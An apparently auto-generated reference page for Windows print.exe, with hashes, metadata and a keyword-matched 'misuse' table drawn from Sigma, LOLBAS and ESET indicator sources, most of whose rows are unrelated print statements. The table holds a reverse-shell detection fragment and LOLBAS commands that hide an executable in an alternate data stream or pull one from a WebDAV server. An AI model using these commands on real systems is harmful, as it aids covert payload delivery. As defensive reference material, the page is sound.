---
title: print.exe | Print Utility
---

# print.exe 

* File Path: `C:\windows\SysWOW64\print.exe`
* Description: Print Utility
* Comments: 

## Hashes

Type | Hash
-- | --
MD5 | `9418E17A38CB14E636C5E1DF1CDBC09B`
SHA1 | `D13A827AC9A795A7EB3DBBBF4D20C4A6F6395E26`
SHA256 | `AB5E21C17A4EA0D66F826657ED714C2DB0880A0A19ADE61ABB92DACC3ACFBC28`
SHA384 | `B865E8287BB2C71A7927B0E16A795199BDA8B6961DEABE42FC83D6EA8B63AD2E11EDF342E22D609E51431AF7F21F9A65`
SHA512 | `5FE5B2EB1BDE5F403DA723AD8E01501288CBD7E3FF31D92F7BB7C7F6015BA45651312F9FB8C037E00A2164FDF6C371B7AE1B809D7E2A693A07DBA4C87CF59FF5`
SSDEEP | `192:1v/R3LP92F+SPkblNEPazXMBv4T42DRXpLXpNBCbgYY2C10FXkdWRUWMWCJ:9/JPEQEPazXMNS4W07Y2x2dWRUW9CJ`

## Runtime Data

### Usage (stdout):
```Batchfile

```

### Usage (stderr):
```Batchfile

```

### Child Processes:


## Signature

* Status: The file C:\windows\SysWOW64\print.exe is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170
* Serial: ``
* Thumbprint: ``
* Issuer: 
* Subject: 

## File Metadata

* Original Filename: Print.Exe.MUI
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 6.3.9600.16384 (winblue_rtm.130821-1623)
* Product Version: 6.3.9600.16384
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `print.exe` being misused. While `print.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [lnx_shell_susp_rev_shells.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/lnx_shell_susp_rev_shells.yml) | `        - ';while(cmd=c.gets);IO.popen(cmd,"r"){\|io\|c.print'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Print.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml) | `Name: Print.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Print.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml) | `  - Command: print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Print.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml) | `  - Command: print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Print.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml) | `  - Command: print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Print.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml) | `  - Path: C:\Windows\System32\print.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Print.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml) | `  - Path: C:\Windows\SysWOW64\print.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Print.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml) | ` - IOC: Print.exe getting files from internet` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Print.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml) | ` - IOC: Print.exe creating executable files on disk` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `    Description: Invoke an HTML Application via mshta.exe (Note - Pops a security warning and a print dialogue box).` | 
[malware-ioc](https://github.com/eset/malware-ioc) | [deprimon](https://github.com/eset/malware-ioc/blob/master/deprimon/README.adoc) | `https://www.welivesecurity.com/2019/11/21/deprimon-default-print-monitor-malicious-downloader/[WeLiveSecurity].` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [deprimon](https://github.com/eset/malware-ioc/blob/master/deprimon/README.adoc) | `[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors\Windows Default Print Monitor]` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [mumblehard](https://github.com/eset/malware-ioc/blob/master/mumblehard/README.adoc) | `under the Perl interpreter. The following command ran as root will print the` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [mumblehard](https://github.com/eset/malware-ioc/blob/master/mumblehard/README.adoc) | `ps -ef \| grep -e ' httpd$' -e ' mail$' -e ' init$' \| awk '{print $2}' \| xargs -I '{}' ls -l '/proc/{}/exe' \| grep perl \| cut -d/ -f 3` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [vf_ioc_linux_rakos.py](https://github.com/eset/malware-ioc/blob/master/rakos/vf_ioc_linux_rakos.py) | `                                print("Suspected PID: {0:8s} {1:<16}:{2:>5} {3:<16}:{4:>5} {5:<15s} {6:>17s}/{7:<5d}\n".format(proto, saddr, sport, daddr, dport, state, task.comm, task.pid))` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    print "mod_str_ : ";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `            print "$f : crypted, skip\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print $fc. "\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_ssh: \n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `            print` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd1: '$sd[1]':'$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc1: '$sc[1]':'$sc[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd1a: file:'$sd[4]'; hash:'$sd[15]'; cvs:'$sd[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd2: '$sd[1]':'$sd[2]':'$sd[3]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    print "mod_sshc4: '$sc[1]':'$sc[0]'\n" if @sc and f $sc[1];` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd4: '$sd[0]':'$sd[1]':'$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd5: " . join( '\|', @sd ) . "\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd6: '$sd[2]':'$sd[0]'\nmod_sshc6: '$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd7: '$sd[0]':'$sd[4]'\nmod_sshc7: '$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd8: '$sd[1]':'$sd[2]'\nmod_sshc8: '$sc[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    if (@sd) { print "mod_sshd12: GET, no params"; ssh_ls() }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd14: hash:'$sd[3]':'$sd[4]':'$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc14: hash:'$sd[3]':'$sd[4]':'$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        else { print "mod_sshd14: unknown hash; fpass:'$sd[1]';'$sd[3]'\n" }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `                    print "mod14p: $d\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd15: '$sd[0]':'$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc15: '$sc[38]':'$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd16: '$sd[0]':'$sd[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc16: '$sc[1]':'$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd17: crypt:'$sd[2]':'$sd[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc17: '$sc[0]':'$sc[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd17: client_string:'$q[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd18: md5:'$sd[3]':'$sd[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc18: md5:'$sc[3]':'$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd19: '$sd[0]':'$sd[1]' url:'$sd[5] '$sd[4]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd20: '$sd[0]':'$sd[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc20: '$sc[0]':'$sc[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd21: '$sd[0]' mod_sshc21: '$sc[0]':'$sc[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc22: '$sd[0]':'$sd[1]':'$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd23: '$sd[2]':'$sd[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc23: '$sc[0]':'$sc[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd24: '$sd[0]':'$sd[17]':'$sd[18]:$sd[20]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc24: '$sc[1]':'$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd25: '$sd[2]':'$sd[0]' mod_sshc25: '$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd27: '$sd[0]':'$sd[2]':'$sd[1]'\nmod_sshc27: '$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd31: hash:'$sd[2]':'$sd[1]':'$sd[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd32: md5:'$sd1[0]:'$sd[0]':'$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd33: '$sd[0]':'$sd[1]':'$sc[0]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `            print $q. "\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd36: md5:'$sd[0]':'$sc[0]'; '$sd[1]':'$sc[1]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd37: md5:'$sd[0]'; '$sd[1]':'$sd[3]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        while (<$fn>) { chomp; print $_ ^ "\x14" x length $_ }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_ssh41_cstr: " . join( '\|', sort keys %ostr ) . "\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd41: '$sd[1]' '$sd[0]', crypted\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc41: '$sc[1]' '$sc[0]', crypted\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd42: detected; log_useragent:passwd_file:passwd\n" if @sd;` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshc42: detected\n"                                   if @sc;` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd44: pass:'$sd[1]' '$sd[0]', '$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    if ( $sc[0] ) { print "mod_sshc44: '$sc[0]' '$sc[13]'\n"; ssh_ls( $sd[0] ) }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd45: pass:'$sd[1]' host:'$sd[0]', '$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    if ( $sc[0] ) { print "mod_sshc45: host:'$sc[0]' '$sc[1]'\n"; ssh_ls() }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd46: crypt:'$sc[1]' v1:'$sd[1]' v2:'$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_sshd47: pass:'$sd[0]' '$sd[1]', '$sd[2]'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    if (@sc) { print "mod_sshc47: host:'$sc[0]' '$sc[-1]'\n"; ssh_ls( $sc[0] ) }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    for (@sd)    { print "mod_md5_sshd: '$_'\n" }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    for (@sc)    { print "mod_md5_ssh: '$_'\n" }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    print "mod_md5_static_ssl: $static_ssl\n" if $static_ssl;` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_hack_strd: possible hacked, " . join( "\|", @sd ) . "\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `        print "mod_hack_strc: possible hacked, " . join( "\|", @sc ) . "\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    for (@sd) { print "mod_md5_sshd1: '$_'\n" }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `            print "mod_str_sshd_str: '" . join( "':'", keys %ostr ) . "'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `            print "mod_str_sshd_str1: '" . join( "':'", keys %ostr ) . "'\n";` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    if (@sd) { print "sshd_str: " . join( '\|', @sd ) . "\n" }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `    if (@sc) { print "sshc_str: " . join( '\|', @sc ) . "\n" }` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [turla](https://github.com/eset/malware-ioc/blob/master/turla/README.adoc) | `** `ResultQueue::print`` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [turla](https://github.com/eset/malware-ioc/blob/master/turla/README.adoc) | `** `TaskQueue::print`` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo](https://github.com/eset/malware-ioc/blob/master/windigo/README.adoc) | `print the dynamic section of the ELF header. Anything NEEDED (type 1) other` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo](https://github.com/eset/malware-ioc/blob/master/windigo/README.adoc) | `OpenSSH version 6.7 or earlier. A clean server will print` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo](https://github.com/eset/malware-ioc/blob/master/windigo/README.adoc) | `to `stderr` but an infected server will only print the usage (note the missing` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo](https://github.com/eset/malware-ioc/blob/master/windigo/README.adoc) | `yields no output if one is not infected and would print a filename if one is.` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo](https://github.com/eset/malware-ioc/blob/master/windigo/README.adoc) | `ps -ef \| grep crond \| grep -v grep \| awk '{print $2}'` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [winnti_group](https://github.com/eset/malware-ioc/blob/master/winnti_group/README.adoc) | `HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\PrintFiiterPipelineSvc\Driver = “DEment.dll”` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
